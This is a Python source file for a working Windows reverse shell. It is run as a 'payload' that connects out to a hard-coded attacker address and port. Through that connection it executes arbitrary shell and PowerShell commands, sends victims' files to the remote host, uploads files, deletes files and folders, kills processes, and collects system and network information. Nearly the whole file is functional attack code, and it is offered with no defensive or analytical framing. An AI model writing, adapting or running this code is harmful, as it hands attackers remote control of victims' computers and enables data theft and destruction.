import socket
import subprocess
import os

class ReverseShell:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        self.sock = None

    def execute_command(self, command):
        try:
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return result.stdout + result.stderr
        except Exception as e:
            return f"Error executing command: {e}\n"

    def execute_powershell(self, command):
        """Executes a PowerShell command."""
        try:
            result = subprocess.run(["powershell", command], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            return result.stdout + result.stderr
        except Exception as e:
            return f"Error executing PowerShell command: {e}\n"

    def handle_connection(self):
        try:
            # Connect to the attacker's system
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.lhost, self.lport))
            self.sock.send(b"[*] Connection established\n")
            
            while True:
                # Receive command from the attacker
                self.sock.send(b"Shell> ")
                command = self.sock.recv(1024).decode().strip()
                
                if not command:
                    continue
                
                # Exit the connection
                if command.lower() == "exit":
                    self.sock.send(b"[*] Closing connection...\n")
                    break
                
                # Handle file management commands
                if command.lower().startswith("download"):
                    self.download_file(command)
                elif command.lower().startswith("upload"):
                    self.upload_file(command)
                elif command.lower().startswith("del"):
                    self.delete_file(command)
                elif command.lower().startswith("mkdir"):
                    self.create_directory(command)
                elif command.lower().startswith("rmdir"):
                    self.remove_directory(command)
                elif command.lower().startswith("rename"):
                    self.rename_file(command)

                # Handle system information commands
                elif command.lower() == "systeminfo":
                    result = self.execute_command("systeminfo")
                    self.sock.send(result.encode())
                elif command.lower() == "tasklist":
                    result = self.execute_command("tasklist")
                    self.sock.send(result.encode())
                elif command.lower().startswith("taskkill"):
                    self.kill_process(command)
                elif command.lower() == "whoami":
                    result = self.execute_command("whoami")
                    self.sock.send(result.encode())
                elif command.lower() == "hostname":
                    result = self.execute_command("hostname")
                    self.sock.send(result.encode())

                # Handle network commands
                elif command.lower() == "ipconfig":
                    result = self.execute_command("ipconfig")
                    self.sock.send(result.encode())
                elif command.lower() == "netstat":
                    result = self.execute_command("netstat -an")
                    self.sock.send(result.encode())
                elif command.lower().startswith("ping"):
                    self.ping_target(command)
                elif command.lower() == "arp":
                    result = self.execute_command("arp -a")
                    self.sock.send(result.encode())

                # Handle PowerShell commands
                elif command.lower().startswith("powershell"):
                    self.execute_powershell_command(command)

                # Execute general commands
                else:
                    output = self.execute_command(command)
                    self.sock.send(output.encode())

            self.sock.close()
        except Exception as e:
            print(f"Error: {e}")
            exit()

    def download_file(self, command):
        try:
            filename = command.split(" ", 1)[1]
            with open(filename, "rb") as file:
                self.sock.send(file.read())
        except Exception as e:
            self.sock.send(f"Error downloading file: {e}\n".encode())

    def upload_file(self, command):
        try:
            filename = command.split(" ", 1)[1]
            self.sock.send(b"[*] Ready to receive file data\n")
            with open(filename, "wb") as file:
                file_data = self.sock.recv(1024)
                while file_data:
                    file.write(file_data)
                    file_data = self.sock.recv(1024)
                self.sock.send(b"[*] Upload complete\n")
        except Exception as e:
            self.sock.send(f"Error uploading file: {e}\n".encode())

    def delete_file(self, command):
        try:
            filename = command.split(" ", 1)[1]
            os.remove(filename)
            self.sock.send(b"[*] File deleted successfully\n")
        except Exception as e:
            self.sock.send(f"Error deleting file: {e}\n".encode())

    def create_directory(self, command):
        try:
            folder_name = command.split(" ", 1)[1]
            os.mkdir(folder_name)
            self.sock.send(b"[*] Folder created successfully\n")
        except Exception as e:
            self.sock.send(f"Error creating folder: {e}\n".encode())

    def remove_directory(self, command):
        try:
            folder_name = command.split(" ", 1)[1]
            os.rmdir(folder_name)
            self.sock.send(b"[*] Folder removed successfully\n")
        except Exception as e:
            self.sock.send(f"Error removing folder: {e}\n".encode())

    def rename_file(self, command):
        try:
            old_name, new_name = command.split(" ", 2)[1:]
            os.rename(old_name, new_name)
            self.sock.send(b"[*] File renamed successfully\n")
        except Exception as e:
            self.sock.send(f"Error renaming file: {e}\n".encode())

    def kill_process(self, command):
        try:
            pid = command.split(" ", 1)[1]
            result = self.execute_command(f"taskkill /PID {pid} /F")
            self.sock.send(result.encode())
        except Exception as e:
            self.sock.send(f"Error killing process: {e}\n".encode())

    def ping_target(self, command):
        try:
            target = command.split(" ", 1)[1]
            result = self.execute_command(f"ping {target}")
            self.sock.send(result.encode())
        except Exception as e:
            self.sock.send(f"Error pinging target: {e}\n".encode())

    def execute_powershell_command(self, command):
        """Execute a PowerShell command."""
        try:
            powershell_command = command.split(" ", 1)[1]
            result = self.execute_powershell(powershell_command)
            self.sock.send(result.encode())
        except Exception as e:
            self.sock.send(f"Error: {e}\n".encode())


# Running the payload
if __name__ == "__main__":
    # Initialize and run the reverse shell
    payload = ReverseShell("192.168.1.4", 4444)  # Attacker's IP and port
    payload.handle_connection()
